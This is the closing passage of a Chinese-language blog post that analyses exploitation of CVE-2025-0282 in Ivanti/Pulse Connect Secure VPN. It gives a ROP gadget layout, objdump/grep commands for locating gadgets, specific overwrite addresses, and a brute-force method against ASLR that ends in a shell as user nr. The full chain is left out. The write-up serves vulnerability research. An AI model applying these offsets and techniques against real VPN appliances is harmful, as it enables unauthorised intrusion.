<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">+--------------------------+</span><br><span class="line">| gadget_0[0x48]           |</span><br><span class="line">+--------------------------+</span><br><span class="line">| mov ebx, 0xfffffff0      | &lt;- Load value into EBX</span><br><span class="line">+--------------------------+</span><br><span class="line">| add esp, 0x204C          | &lt;- Adjust stack pointer</span><br><span class="line">+--------------------------+</span><br><span class="line">| mov eax, ebx             | &lt;- Copy EBX to EAX</span><br><span class="line">+--------------------------+</span><br><span class="line">| pop ebx                  | &lt;- Restore EBX</span><br><span class="line">+--------------------------+</span><br><span class="line">| pop esi                  | &lt;- Restore ESI</span><br><span class="line">+--------------------------+</span><br><span class="line">| pop edi                  | &lt;- Restore EDI</span><br><span class="line">+--------------------------+</span><br><span class="line">| pop ebp                  | &lt;- Restore EBP</span><br><span class="line">+--------------------------+</span><br><span class="line">| ret                      | &lt;- Return to caller</span><br><span class="line">+--------------------------+</span><br></pre></td></tr></table></figure>

<p>于是我采用了一个最笨的方法， 将所有引用的 lib 库全部objdump 一遍， 然后去grep </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">objdump --x86-asm-syntax=intel -D  $(find . -name <span class="string">&quot;libagentdcs.so&quot;</span>) 2&gt;&amp;1 &gt; libagentdcs.so.so.txt</span><br><span class="line"></span><br><span class="line">cat ibdsplibs.txt|grep -e <span class="string">&quot;add\tesp, 0x204c&quot;</span></span><br></pre></td></tr></table></figure>

<p>在<code>libdsplibs.so</code> 的  <code>0x93849C</code> 地址找到了这个 gadget ，意料之外的是这里具体居然是个 swithc table 表</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2025-01-15-89564e17d217fee0e6c12ed9f7bfcaee-6ad36d.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2025-01-15-89564e17d217fee0e6c12ed9f7bfcaee-6ad36d.png" alt="image.png"></a></p>
<p>按照代码逻辑， 我们只要反着算就行， 例如我们这里最后 <code>vtable</code> 的地址是 <code>0x11D8940</code>， 那么就需要有一个地址存储这个指针， 直接在 ida 的binary search 里搜索</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2025-01-15-0799c44da550e4b6c66a26cee2362600-6dbaf5.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2025-01-15-0799c44da550e4b6c66a26cee2362600-6dbaf5.png" alt="image.png"></a></p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2025-01-15-875e3f9387a3a87c2deabbf7904f8d07-01608c.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2025-01-15-875e3f9387a3a87c2deabbf7904f8d07-01608c.png" alt="image.png"></a></p>
<p>找到一个这个， 所以我们最后要覆盖的<code>this</code> 指针地址为  <code>0x00934F4C</code>， 后面正常 rop 就行， 这里提一句 libc的随机化是 0xfff 位， 多核启动的时候会有一个主进程不断的fork子进程，因此我们爆破 0xfff次就一定能成功执行</p>
<p>拿到的权限是  nr 权限</p>
<pre><code class="bash">bash-4.2$ id
id
uid=104(nr) gid=104(nr) groups=104(nr) context=system_u:system_r:kernel_t:s0
bash-4.2$
</code></pre>
<p>完整的ROP链也留给读者实现了。</p>
<h2 id="Reference-link"><a href="#Reference-link" class="headerlink" title="Reference link"></a>Reference link</h2><div id="footnotes"><hr><div id="footnotelist"><ol style="list-style: none; padding-left: 0; margin-left: 40px"><li id="fn:1"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">1.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;">OpenConnect https://www.infradead.org/openconnect/download.html<a href="#fnref:1" rev="footnote"> ↩</a></span></li><li id="fn:2"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">2.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;">https://labs.watchtowr.com/exploitation-walkthrough-and-techniques-ivanti-connect-secure-rce-cve-2025-0282/<a href="#fnref:2" rev="footnote"> ↩</a></span></li></ol></div></div></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
        var options = {
            selector: '.gallery-item'
        };
        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
        }</script>
</div>


  <footer class="post-footer">
  
    <div class="post-categories">
      <span class="meta-label">分类: </span>
      
        <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="category">漏洞分析</a>
      
    </div>
  
  
    <div class="post-tags">
      <span class="meta-label">标签: </span>
      
        <a href="/tags/CVE-2025-0282/" class="tag">CVE-2025-0282</a>
      
        <a href="/tags/pulse/" class="tag">pulse</a>
      
        <a href="/tags/vpn/" class="tag">vpn</a>
      
    </div>
  
</footer>


  
<nav class="post-nav">
  
    <div class="post-nav-item prev">
      <span class="post-nav-label">&larr; Prev</span>
      <a href="/Vigor2960-Memoirs-Pursuit-of-the-Elusive.html" class="post-nav-title">
        议题分享：Vigor2960 Memoirs Pursuit of the Elusive 0day &amp; 1day
      </a>
    </div>
  

  
    <div class="post-nav-item next">
      <span class="post-nav-label">Next &rarr;</span>
      <a href="/CVE-2024-41592-vigor-stack-overflow.html" class="post-nav-title">
        CVE-2024-41592 vigor 栈溢出漏洞分析
      </a>
    </div>
  
</nav>



  
</article>

        </div>
      
    </main>

    <footer class="footer">
  <div class="footer-content">
    <div class="footer-left">
      
      <span class="copyright">
        &copy; 2024 - 2026 Swing
      </span>
    </div>

    <div class="footer-right">
      
        <span class="powered">
          Powered by Hexo <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a>
        </span>
      
      
        <span class="theme-info">
          Theme <a href="https://github.com/yourname/hexo-theme-Bloom" target="_blank" rel="noopener">Bloom</a>
        </span>
      
    </div>
  </div>

  
    <div class="footer-social">
      
        <a href="https://github.com/WinMin" class="social-link" target="_blank" rel="noopener" aria-label="GitHub">
          <svg viewBox="0 0 24 24" width="20" height="20"><path fill="currentColor" d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/></svg>
        </a>
      
      
        <a href="https://twitter.com/bestswngs" class="social-link" target="_blank" rel="noopener" aria-label="Twitter">
          <svg viewBox="0 0 24 24" width="20" height="20"><path fill="currentColor" d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
        </a>
      
      
      
        <a href="mailto:ask@mail.exp.sh" class="social-link" aria-label="Email">
          <svg viewBox="0 0 24 24" width="20" height="20"><path fill="currentColor" d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg>
        </a>
      
      
        <a href="/atom.xml" class="social-link" aria-label="RSS">
          <svg viewBox="0 0 24 24" width="20" height="20"><path fill="currentColor" d="M6.18 15.64a2.18 2.18 0 0 1 2.18 2.18C8.36 19 7.38 20 6.18 20C5 20 4 19 4 17.82a2.18 2.18 0 0 1 2.18-2.18M4 4.44A15.56 15.56 0 0 1 19.56 20h-2.83A12.73 12.73 0 0 0 4 7.27V4.44m0 5.66a9.9 9.9 0 0 1 9.9 9.9h-2.83A7.07 7.07 0 0 0 4 12.93V10.1z"/></svg>
        </a>
      
    </div>
  
</footer>

  </div>

  <!-- Main Script -->

<script src="/js/main.js"></script>


<!-- Search -->


<script src="/js/search.js"></script>



<!-- Baidu Analytics -->


</body>
</html>
